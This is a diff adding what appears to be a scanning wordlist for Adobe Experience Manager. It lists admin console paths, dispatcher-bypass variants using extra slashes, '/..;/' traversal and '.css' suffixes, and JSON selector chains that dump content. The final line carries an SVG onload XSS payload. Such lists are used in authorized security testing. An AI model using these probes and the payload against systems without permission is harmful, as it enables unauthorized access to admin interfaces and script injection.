@@ -1,0 +1,16 @@
+/system/console?.css
+/crx/explorer/nodetypes/index.jsp
+/system/console/bundles
+///system///console///bundles
+/miscadmin
+/mcmadmin#/content/dashboard
+/miscadmin#/etc/mobile
+/miscadmin#/etc/segmentation
+/miscadmin#/etc/blueprints
+/miscadmin#/etc/designs
+/miscadmin#/etc/importers
+/miscadmin#/etc/reports
+/miscadmin#/etc/msm/rolloutconfigs
+//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
+/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
+/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
